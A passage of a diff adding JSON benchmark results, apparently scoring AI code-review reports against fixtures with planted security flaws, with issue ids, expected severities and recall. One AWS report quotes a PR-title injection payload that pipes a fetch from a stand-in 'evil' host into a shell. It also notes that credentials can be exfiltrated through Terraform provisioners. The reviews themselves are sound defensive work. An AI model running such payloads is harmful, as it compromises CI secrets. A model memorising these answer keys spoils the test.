set at the CDN. A CSP would limit the damage from the XSS above.\n\n[Low] Article headings and loading states are weak for assistive tech — src/App.tsx, src/components/ArticleView.tsx\n- The page `h1` is \"News Reader\" and the article uses `h2`, which is fine.\n- The \"Loading…\" and error messages are not live regions (`role=\"status\"` or `role=\"alert\"`).\n- A new article does not move or announce focus.\n\n[Info] `readingMinutes` is exported from src/format.ts but never used in the code I read. Backend reviewer: confirm the server checks the Bearer token and that `/articles/:id` enforces authorization.\n\n## What I checked\n- `src/App.tsx`, `src/api.ts`, `src/components/ArticleView.tsx`, `src/components/LoginForm.tsx`, `src/format.ts`.\n- `index.html`, `vite.config.ts`, `tsconfig.json` (strict is on).\n- Searches: I read all 12 tracked files except `.env.example`, `package.json`, `src/main.tsx` and `src/format.test.ts`.\n\n## What I did not check\n- `.env.example`: access denied.\n- `package.json` and the dependency list: not read, so no manifest review of dependencies.\n- `src/main.tsx` and `src/format.test.ts`: not read.\n- No browser run, no build, no tests, no `npm audit`, and no CDN or hosting headers.\n\n## Questions for the owner\n- Is `VITE_NEWS_API_KEY` a browser-restricted key or a secret?\n- Is `bodyHtml` produced from trusted sources only? If not, the XSS finding stays Critical.",
+          "tools": 10,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 23126,
+            "cache_read_input_tokens": 54003,
+            "output_tokens": 3429,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 23126,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2355,
+                "cache_read_input_tokens": 24625,
+                "cache_creation_input_tokens": 3429,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 3429
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 3,
+            "criticalHighFound": 3,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "html-injection-xss",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Unsanitised server HTML is injected, and the token is stealable — src/components/ArticleView.tsx:21"
+              },
+              {
+                "id": "token-in-localstorage",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Unsanitised server HTML is injected, and the token is stealable — src/components/ArticleView.tsx:21"
+              },
+              {
+                "id": "blank-without-rel",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] `sourceUrl` is unvalidated and `target=\"_blank\"` has no `rel` — src/components/ArticleView.tsx:23, src/App.tsx:25"
+              },
+              {
+                "id": "inputs-without-labels",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] The login form is not accessible and can be submitted twice — src/components/LoginForm.tsx:21-24"
+              },
+              {
+                "id": "img-without-alt",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Low",
+                "via": "block",
+                "foundTitle": "[Low] The logo image has no `alt` — src/App.tsx:13"
+              },
+              {
+                "id": "effect-missing-dependency",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] The effect uses a stale `id`, and the interval is never cleared — src/components/ArticleView.tsx:9-13"
+              },
+              {
+                "id": "interval-never-cleared",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] The effect uses a stale `id`, and the interval is never cleared — src/components/ArticleView.tsx:9-13"
+              },
+              {
+                "id": "whole-lodash-import",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Low",
+                "via": "block",
+                "foundTitle": "[Low] Whole lodash import for one function — src/format.ts:1"
+              },
+              {
+                "id": "api-key-in-vite-env",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] A third-party key ships in the bundle and the URL — src/api.ts:2,27"
+              }
+            ],
+            "citations": {
+              "total": 12,
+              "valid": 12,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 3,
+              "ok": 2,
+              "sanity": 0.6666666666666666
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 2,
+              "over": 5,
+              "under": 2
+            },
+            "extraFindings": 2,
+            "extraTitles": [
+              "[Medium] A stale token leaves the user stuck, and the failure message is wrong — src/App.tsx:7, src/api.ts:28, src/components/LoginForm.tsx:14",
+              "[Low] Article headings and loading states are weak for assistive tech — src/App.tsx, src/components/ArticleView.tsx"
+            ],
+            "infoFindings": 1,
+            "blocks": 11,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 9,
+            "planted": 9,
+            "blocks": 11,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "raws",
+          "fixture": "aws-infra",
+          "variant": "old",
+          "rep": 1,
+          "systemBytes": 1995,
+          "status": "ok",
+          "wallMs": 25935,
+          "report": "**Verdict: Do not ship.** There are several Critical findings, including a public customer-data bucket, a public database, and a workflow that lets untrusted PR code run with AWS credentials. I reviewed all 9 `.tf` files and `deploy.yml`. I did not call the security-review or code-review skills. The tree is clean, so there is no diff for them to review.\n\n## Critical\n1. **`.github/workflows/deploy.yml:4,13-15,22-29`: the workflow lets untrusted PR code run with AWS credentials.**\n   - It triggers on `pull_request_target`, which runs with repo secrets, and checks out the PR head SHA.\n   - `terraform plan` then runs that code with `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` and `DB_PASSWORD` in the environment.\n   - Anyone who can open a PR can exfiltrate the credentials, for example through a `local-exec` provisioner or an external data source.\n   - Use `pull_request` with no secrets, or use OIDC and a read-only plan role.\n2. **`s3.tf:5-8`: the customer-uploads bucket is `public-read`.**\n   - There is no `aws_s3_bucket_public_access_block`, and no encryption or logging.\n3. **`rds.tf:18`: the database has `publicly_accessible = true`, and `rds.tf:3` puts it in public subnets.**\n   - The DB security group only allows the app security group, which limits exposure. It is still the wrong design, and one rule change would expose it.\n   - It also has no `storage_encrypted`. Move it to private subnets and set `publicly_accessible = false`.\n4. **`iam.tf:21-30`: the app role has `Action \"*\"` on `Resource \"*\"`.**\n   - Any compromise of an instance becomes full account takeover. Scope it to the uploads bucket and whatever else the app actually needs.\n5. **`network.tf:28-34`: SSH (port 22) is open to `0.0.0.0/0`.**\n   - Remove it and use SSM Session Manager instead.\n\n## High\n- **`deploy.yml:31-37`: the apply step has no approval gate.**\n  - It runs `terraform apply -auto-approve` on every push to main.\n  - There is no protected environment or required reviewer. It also applies a plan produced in the same job.\n- **`deploy.yml:13,17`: the actions are pinned to `@main`.** Pin them to commit SHAs. Also set `permissions:` explicitly.\n- **`deploy.yml:24-25`: the workflow uses long-lived static AWS keys.** Switch to OIDC with a least-privilege role.\n- **`deploy.yml:20`: the PR title is interpolated directly into a shell `run:`, which allows script injection.** Pass it through `env:` instead.\n- **`rds.tf:19-21`: backups and failover are off.**\n  - `backup_retention_period = 0`, `skip_final_snapshot = true` and `multi_az = false`.\n  - Add `deletion_protection`, and consider encryption with a customer-managed KMS key.\n- **`versions.tf`: provider and Terraform versions are unpinned, and there is no remote backend.**\n  - There is no state locking either, and state would also hold `db_password`.\n  - CI runs `terraform init` with no backend, so state is lost on every run and each apply tries to recreate everything.\n  - The `random` provider is declared but never used.\n\n## Medium\n- **`network.tf:1`: the VPC module has no version pin.**\n- **`network.tf:11-12`: `single_nat_gateway = true` is a single point of failure.** It is acceptable for cost, but note the trade-off.\n- **`main.tf:26-36`: the ASG has no health checks and no ELB or target group.**\n  - Nothing matches the \"load balancer\" comment on the app security group's port 443 rule, and there is no ALB anywhere in the code.\n  - There is no instance refresh, so `$Latest` launch template changes don't roll out.\n- **`main.tf:1-9`: `most_recent = true` on the AMI means every plan can pick a different image.**\n- **Audit trail:** there is no CloudTrail, VPC flow logs or S3 access logging.\n- **`s3.tf`: the bucket has no server-side encryption configuration.** Add a deny rule for non-TLS requests.\n- **`main.tf:21-23`: the launch template has no EBS encryption.** IMDSv2 is correctly required, which is good.\n\n## Low\n- There are no tags or `default_tags`, so cost allocation isn't possible.\n- The `t3.small` and `db.t3.medium` sizes are unjustified.\n- There is no CDN in front of the uploads.\n- The workflow has no `fmt`, `validate`, tfsec or checkov step.\n\n## Not checked\n- I did not run `terraform validate` or `plan` (I can't run commands).\n- I did not check the live AWS account state or the GitHub repo settings (branch protection, secret scoping).\n- There is no application code in the repo, so I could not tell what permissions the app actually needs.",
+          "tools": 11,
+          "toolNames": {
+            "Glob": 1,
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 20236,
+            "cache_read_input_tokens": 45933,
+            "output_tokens": 2917,
+            "output_tokens_details": {
+              "thinking_tokens": 72
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 20236,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 1717,
+                "cache_read_input_tokens": 20682,
+                "cache_creation_input_tokens": 4482,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4482
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 7,
+            "criticalHighFound": 7,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "iam-wildcard",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "4. **`iam.tf:21-30`: the app role has `Action \"*\"` on `Resource \"*\"`.**"
+              },
+              {
+                "id": "s3-public-unencrypted",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "2. **`s3.tf:5-8`: the customer-uploads bucket is `public-read`.**"
+              },
+              {
+                "id": "ssh-open-to-world",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "5. **`network.tf:28-34`: SSH (port 22) is open to `0.0.0.0/0`.**"
+              },
+              {
+                "id": "rds-public-no-backups",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **`rds.tf:19-21`: backups and failover are off.**"
+              },
+              {
+                "id": "unpinned-versions",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **`versions.tf`: provider and Terraform versions are unpinned, and there is no remote backend.**"
+              },
+              {
+                "id": "static-aws-keys",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **`deploy.yml:24-25`: the workflow uses long-lived static AWS keys.** Switch to OIDC with a least-privilege role."
+              },
+              {
+                "id": "pull-request-target-head",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "1. **`.github/workflows/deploy.yml:4,13-15,22-29`: the workflow lets untrusted PR code run with AWS credentials.**"
+              },
+              {
+                "id": "title-injection-in-run",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **`deploy.yml:20`: the PR title is interpolated directly into a shell `run:`, which allows script injection.** Pass it through `env:` instead."
+              },
+              {
+                "id": "actions-pinned-to-branch",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "- **`deploy.yml:13,17`: the actions are pinned to `@main`.** Pin them to commit SHAs. Also set `permissions:` explicitly."
+              }
+            ],
+            "citations": {
+              "total": 16,
+              "valid": 16,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 7,
+              "ok": 7,
+              "sanity": 1
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 5,
+              "over": 4,
+              "under": 0
+            },
+            "extraFindings": 9,
+            "extraTitles": [
+              "- **`deploy.yml:31-37`: the apply step has no approval gate.**",
+              "- **`network.tf:11-12`: `single_nat_gateway = true` is a single point of failure.** It is acceptable for cost, but note the trade-off.",
+              "- **`main.tf:26-36`: the ASG has no health checks and no ELB or target group.**",
+              "- **`main.tf:1-9`: `most_recent = true` on the AMI means every plan can pick a different image.**",
+              "- **Audit trail:** there is no CloudTrail, VPC flow logs or S3 access logging.",
+              "- There are no tags or `default_tags`, so cost allocation isn't possible.",
+              "- The `t3.small` and `db.t3.medium` sizes are unjustified.",
+              "- There is no CDN in front of the uploads.",
+              "- The workflow has no `fmt`, `validate`, tfsec or checkov step."
+            ],
+            "infoFindings": 0,
+            "blocks": 22,
+            "format": {
+              "verdictFirstLine": false,
+              "rubricLabels": true,
+              "notChecked": false,
+              "compliant": false
+            }
+          },
+          "firstPass": {
+            "found": 0,
+            "planted": 9,
+            "blocks": 0,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "raws",
+          "fixture": "aws-infra",
+          "variant": "new",
+          "rep": 1,
+          "systemBytes": 13418,
+          "status": "ok",
+          "wallMs": 35110,
+          "report": "VERDICT: block\n\nThe deploy workflow lets untrusted pull-request code run with AWS credentials and apply to the account. The infrastructure also has a public customer-upload bucket, a public unencrypted database, and an admin-wildcard instance role. I read all 9 files. Nothing was planned or run.\n\n[Critical] Fork PR code runs with AWS secrets and can apply — .github/workflows/deploy.yml:4,13-15\nEvidence: `pull_request_target:` … `ref: ${{ github.event.pull_request.head.sha || github.sha }}` … `AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}`\nWhy it matters: `pull_request_target` runs with repository secrets, and the job checks out the PR head. A PR can add a `.tf` file with an `external` data source, a `local-exec` provisioner, or a malicious provider. `terraform init` or `plan` then runs it with the AWS keys and `DB_PASSWORD`. The step name, `plan-and-apply`, suggests apply is the intent; the apply step is guarded by `github.ref == 'refs/heads/main'`.\nFix: Use `pull_request` with no secrets for plan, or OIDC with a read-only plan role. Run apply only on `push` to main, in a protected `environment:` with required reviewers. Never check out PR head under `pull_request_target`.\n\n[Critical] Customer uploads bucket is public-read — s3.tf:5-8\nEvidence: `acl = \"public-read\"` on `aws_s3_bucket_acl.uploads`; there is no `aws_s3_bucket_public_access_block`.\nWhy it matters: Anyone can list and read customer uploads. This also fails on new buckets, which have ACLs disabled by default, unless ownership controls are set elsewhere. No such resource appears in the repository.\nFix: Delete the ACL resource. Add `aws_s3_bucket_public_access_block` with all four settings true. Add SSE-KMS encryption and a TLS-only bucket policy.\n\n[Critical] Database is public, with no backups or encryption — rds.tf:3,18-21\nEvidence: `subnet_ids = module.vpc.public_subnets`, `publicly_accessible = true`, `backup_retention_period = 0`, `skip_final_snapshot = true`\nWhy it matters: The database is placed in public subnets with a public address. The db security group only admits the app SG, which limits exposure; severity is Critical because the other settings leave no recovery path. Backups are off and deletion leaves no snapshot. `storage_encrypted` is not set, so storage is unencrypted. `deletion_protection` is off, and the instance is single-AZ. A `terraform destroy` or a replacement permanently loses the orders data.\nFix: Use `module.vpc.private_subnets` (or a `database_subnets` group). Set `publicly_accessible = false`, `storage_encrypted = true`, `backup_retention_period = 7`, `deletion_protection = true`, `skip_final_snapshot = false`, `multi_az = true`. Consider `manage_master_user_password = true`, since `var.db_password` also ends up in state.\n\n[High] Instance role has full admin — iam.tf:25-27\nEvidence: `Action = \"*\"`, `Resource = \"*\"` in `aws_iam_role_policy.app`\nWhy it matters: Any compromise of an app instance gives full control of the account, including IAM and data deletion.\nFix: Scope to the needed S3 prefix, secrets, and so on, using specific actions and ARNs.\n\n[High] SSH open to the world — network.tf:28-34\nEvidence: `description = \"Admin shell\"`, `from_port = 22`, `cidr_blocks = [\"0.0.0.0/0\"]` on `aws_security_group.app`\nWhy it matters: SSH on the app tier is reachable from the internet. The instances are in private subnets, so there is no direct route today, but the rule is exposed to any later change. Another problem: the \"HTTPS from the load balancer\" rule allows the whole VPC CIDR, and no load balancer is defined anywhere.\nFix: Remove the rule and use SSM Session Manager. If SSH is needed, restrict it to a bastion SG or a specific CIDR.\n\n[High] Static AWS keys and unpinned actions in the pipeline — deploy.yml:13,17,24-25,34-35\nEvidence: `actions/checkout@main`, `hashicorp/setup-terraform@main`, `AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}`\nWhy it matters: Branch-pinned actions run with the keys, so an upstream push becomes code execution in the deploy job. Long-lived keys have no expiry and no scoping to the branch or environment.\nFix: Pin actions to full SHAs. Use `aws-actions/configure-aws-credentials` with `role-to-assume` and `permissions: id-token: write, contents: read`. Add `permissions:` at the workflow level.\n\n[Medium] Script injection through the PR title — deploy.yml:20\nEvidence: `run: echo \"Deploying ${{ github.event.pull_request.title }}\"`\nWhy it matters: A PR title such as `\"; curl evil|sh #` runs commands in the job. Together with `pull_request_target`, it executes in a context that has secrets.\nFix: Pass it as `env: TITLE: ${{ github.event.pull_request.title }}` and use `echo \"$TITLE\"`, or drop the step.\n\n[Medium] No remote state, unpinned providers and module — versions.tf:2-8, network.tf:2\nEvidence: `source = \"hashicorp/aws\"` with no `version`; `source = \"terraform-aws-modules/vpc/aws\"` with no `version`; no `backend` block\nWhy it matters: CI has no persisted state. Every run would plan from empty state, so it would try to recreate everything, and apply could duplicate or collide with resources. There is no locking and no `.terraform.lock.hcl` in the repository. Provider and module versions float. The `random` provider is declared but not used.\nFix: Add an S3 backend with encryption and `use_lockfile` (or a DynamoDB table). Pin provider and module versions and commit the lock file.\n\n[Medium] Apply uses a plan file produced in the same job without approval — deploy.yml:31-37\nEvidence: `terraform apply -auto-approve tfplan`\nWhy it matters: Every push to main applies automatically with no review of the plan and no environment gate. Combined with the admin-level keys, a merge is a direct production change.\nFix: Add `environment: production` with required reviewers, and split plan and apply into separate jobs.\n\n[Low] ASG and launch template hardening — main.tf:11-36\nEvidence: `version = \"$Latest\"`, `data.aws_ami.al2023` with `most_recent = true`, no `health_check_type`, no EBS encryption\nWhy it matters: A new AMI or template version rolls out unplanned. There is no ELB health check, because no target group is attached. Root volumes are not encrypted explicitly.\nFix: Set `version = aws_launch_template.app.latest_version`, add `instance_refresh`, set `encrypted = true` on the block device, and attach a load balancer target group.\n\n[Low] Single NAT gateway, no flow logs or CloudTrail — network.tf:11-12\nEvidence: `single_nat_gateway = true`\nWhy it matters: This is a cost-saving choice but a single point of failure for egress from both AZs. No VPC flow logs, CloudTrail or alarms are declared.\n\n[Info] outputs.tf exposes the DB endpoint, the bucket name and the role ARN. None of these are secrets.\n\n## What I checked\nAll 9 tracked files: `.github/workflows/deploy.yml`, `iam.tf`, `main.tf`, `network.tf`, `rds.tf`, `s3.tf`, `variables.tf`, `versions.tf`, `outputs.tf`. I also checked variable defaults. Only `db_password` has none; it is marked `sensitive` and comes from a secret.\n\n## What I did not check\n- Deployed state, console-created resources and organisation-level policies (SCPs, account-level S3 block public access). I cannot reach an account.\n- Whether `terraform validate` passes. I did not run it.\n- Branch protection and the GitHub environment settings, which are not in the repository.\n- Whether a load balancer, KMS keys or CloudTrail exist outside this repository.\n\n## Questions for the owner\n- Is there an S3 backend or Terraform Cloud config outside the repository? If not, the pipeline cannot work safely.\n- Is the AWS account shared with other workloads? The admin role and the static keys matter more if so.",
+          "tools": 10,
+          "toolNames": {
+            "Bash": 1,
+            "Read": 9
+          },
+          "usage": {
+            "input_tokens": 6,
+            "cache_creation_input_tokens": 24237,
+            "cache_read_input_tokens": 54154,
+            "output_tokens": 4031,
+            "output_tokens_details": {
+              "thinking_tokens": 0
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 24237,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 2980,
+                "cache_read_input_tokens": 24683,
+                "cache_creation_input_tokens": 4482,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 4482
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 9,
+            "found": 9,
+            "recall": 1,
+            "looseFound": 9,
+            "looseRecall": 1,
+            "criticalHighPlanted": 7,
+            "criticalHighFound": 7,
+            "criticalHighRecall": 1,
+            "issues": [
+              {
+                "id": "iam-wildcard",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Instance role has full admin — iam.tf:25-27"
+              },
+              {
+                "id": "s3-public-unencrypted",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Customer uploads bucket is public-read — s3.tf:5-8"
+              },
+              {
+                "id": "ssh-open-to-world",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] SSH open to the world — network.tf:28-34"
+              },
+              {
+                "id": "rds-public-no-backups",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Database is public, with no backups or encryption — rds.tf:3,18-21"
+              },
+              {
+                "id": "unpinned-versions",
+                "expectedSeverity": "Low",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] No remote state, unpinned providers and module — versions.tf:2-8, network.tf:2"
+              },
+              {
+                "id": "static-aws-keys",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Static AWS keys and unpinned actions in the pipeline — deploy.yml:13,17,24-25,34-35"
+              },
+              {
+                "id": "pull-request-target-head",
+                "expectedSeverity": "Critical",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Critical",
+                "via": "block",
+                "foundTitle": "[Critical] Fork PR code runs with AWS secrets and can apply — .github/workflows/deploy.yml:4,13-15"
+              },
+              {
+                "id": "title-injection-in-run",
+                "expectedSeverity": "High",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "Medium",
+                "via": "block",
+                "foundTitle": "[Medium] Script injection through the PR title — deploy.yml:20"
+              },
+              {
+                "id": "actions-pinned-to-branch",
+                "expectedSeverity": "Medium",
+                "found": true,
+                "looseFound": true,
+                "foundSeverity": "High",
+                "via": "block",
+                "foundTitle": "[High] Static AWS keys and unpinned actions in the pipeline — deploy.yml:13,17,24-25,34-35"
+              }
+            ],
+            "citations": {
+              "total": 12,
+              "valid": 12,
+              "hallucinated": 0,
+              "validity": 1,
+              "bad": []
+            },
+            "severity": {
+              "checked": 7,
+              "ok": 6,
+              "sanity": 0.8571428571428571
+            },
+            "calibration": {
+              "n": 9,
+              "exact": 3,
+              "over": 4,
+              "under": 2
+            },
+            "extraFindings": 3,
+            "extraTitles": [
+              "[Medium] Apply uses a plan file produced in the same job without approval — deploy.yml:31-37",
+              "[Low] ASG and launch template hardening — main.tf:11-36",
+              "[Low] Single NAT gateway, no flow logs or CloudTrail — network.tf:11-12"
+            ],
+            "infoFindings": 1,
+            "blocks": 12,
+            "format": {
+              "verdictFirstLine": true,
+              "rubricLabels": true,
+              "notChecked": true,
+              "compliant": true
+            }
+          },
+          "firstPass": {
+            "found": 9,
+            "planted": 9,
+            "blocks": 12,
+            "scorer": 1
+          }
+        },
+        {
+          "role": "rbe",
+          "fixture": "express-api",
+          "variant": "old",
+          "rep": 2,
+          "systemBytes": 2139,
+          "status": "ok",
+          "wallMs": 30310,
+          "report": "**Verdict: Do not ship.** There is an unauthenticated SQL injection, an account-takeover path in password reset, and an IDOR on orders. I read all of `src/`, `db/schema.sql` and `package.json`. I did not run anything.\n\n**Critical**\n1. **SQL injection** at `src/routes/products.js:20`. `q` is concatenated straight into the SQL on a public route. Use `ILIKE $1` with `'%' + term + '%'` as the parameter.\n2. **Order IDOR** at `src/routes/orders.js:19`. `GET /orders/:id` has no `user_id` filter, so any logged-in user can read anyone's order, including `ship_to`, which is personal data. Add `AND user_id = $2` and return 404 on a miss.\n3. **Weak password-reset token** at `src/routes/auth.js:26`. The token comes from `Math.random()`, so it is predictable. Use `crypto.randomBytes(32)` and store only a hash of it.\n4. **Hardcoded fallback JWT secret** at `src/config.js:4`. If `JWT_SECRET` is unset, anyone can forge tokens using the value in the repo. The DB URL fallback at line 3 also carries credentials. Fail at startup when these are missing, and rotate the key if it was ever used in a real deployment.\n\n**High**\n5. **Error handler leaks internals** at `src/server.js:17`. It returns `err.message` and the stack trace to clients. Log them server-side and return a generic message.\n6. **Reset-token handling** at `src/routes/auth.js:35-45`.\n   - The reset token is stored in plaintext and picked up by the mailer from the users table.\n   - Confirm doesn't clear `reset_expires` and doesn't validate that `password` exists. A missing password makes `bcrypt.hash` throw, which returns a 500 with the stack trace.\n   - There is no password-strength check.\n7. **No rate limiting** on `/login`, `/password-reset` or the confirm route. Brute force and token guessing are open.\n8. **Order input not validated** at `src/routes/orders.js:29-37`.\n   - `quantity` is never checked, so a negative or fractional value gives a negative or wrong total, and a missing value gives `NaN`.\n   - `productId` and `shipTo` are unchecked types.\n   - Prices are read per item with no transaction.\n\n**Medium**\n9. **N+1 queries** at `src/routes/orders.js:32-36`: one product query per item, with no cap on `items`. Use a single `WHERE id = ANY($1)` and limit the array size.\n10. **No order-item table.** `db/schema.sql` stores only a total, so the order contents are lost and prices can't be audited. There is no idempotency key either, so a retried POST creates a duplicate order.\n11. **Unbounded and unindexed queries.** `GET /orders` has no pagination. There is no index on `orders.user_id` or `users.reset_token`. The `ILIKE '%…%'` search can't use an index and will be slow on a large catalogue. The `OFFSET` paging on `/products` degrades at deep pages.\n12. **No hardening in `src/server.js`.**\n    - No `helmet`, CORS policy, or JSON body size limit beyond Express's default.\n    - No request or DB timeouts: the pool has no `connectionTimeoutMillis` or `statement_timeout`.\n    - No graceful shutdown.\n    - No handler for `unhandledRejection`.\n13. **Weak authentication details.**\n    - JWT verification doesn't pin the algorithm.\n    - The 12h tokens can't be revoked.\n    - `/login` leaks timing between unknown and known emails, because bcrypt only runs when the user exists.\n    - `/password-reset` always returns ok, which is good.\n\n**Low**\n- Login and reset don't normalise or validate email.\n- bcrypt cost is 10, so consider 12.\n- The `lint` script only runs `node --check` on some files and not `config.js`, `db.js` or `util.js`.\n- Money is held as integer cents, which is good, but a 32-bit `INTEGER` can overflow on large quantities.\n\n**Personal data (DPDP)**\nI couldn't call the `dpdp-compliance` skill: this tier can't run it, so this section comes from reading the code. The API stores email, the shipping address and password hashes. I found no consent capture, no stated purpose, and no retention or deletion path. There are no routes for access, correction or erasure. Full stack traces containing request data go to `console.error`. Treat this as a gap if Indian users are in scope.\n\n**Not checked**\n- `test/util.test.js`: I didn't read it, so I can't say anything about test coverage.\n- Dependency vulnerabilities: there's no lockfile, and I didn't run an audit.\n- The mailer service and any deployment config.\n- Git history for leaked secrets: only one commit exists, and I only looked at the working tree.\n- The `fastapi-standards` and `spring-boot-standards` skills: they don't apply to this Express stack.\n\n**Suggested fix order:** 1, 2, 3, 4, 5, then 7 and 8.",
+          "tools": 12,
+          "toolNames": {
+            "Bash": 1,
+            "Glob": 1,
+            "Read": 10
+          },
+          "usage": {
+            "input_tokens": 8,
+            "cache_creation_input_tokens": 21687,
+            "cache_read_input_tokens": 67371,
+            "output_tokens": 3031,
+            "output_tokens_details": {
+              "thinking_tokens": 45
+            },
+            "server_tool_use": {
+              "web_search_requests": 0,
+              "web_fetch_requests": 0
+            },
+            "service_tier": "standard",
+            "cache_creation": {
+              "ephemeral_1h_input_tokens": 21687,
+              "ephemeral_5m_input_tokens": 0
+            },
+            "inference_geo": "global",
+            "iterations": [
+              {
+                "input_tokens": 2,
+                "output_tokens": 1729,
+                "cache_read_input_tokens": 21600,
+                "cache_creation_input_tokens": 5015,
+                "cache_creation": {
+                  "ephemeral_5m_input_tokens": 0,
+                  "ephemeral_1h_input_tokens": 5015
+                },
+                "type": "message"
+              }
+            ],
+            "speed": "standard",
+            "fallback_credit": null
+          },
+          "score": {
+            "planted": 6,
+            "found": 5,
+            "recall": 0.8333333333333334,
+            "looseFound": 6,
+            "looseRecall": 1,
+            "criticalHighPlanted": 4,
+            "criticalHighFound": 4,
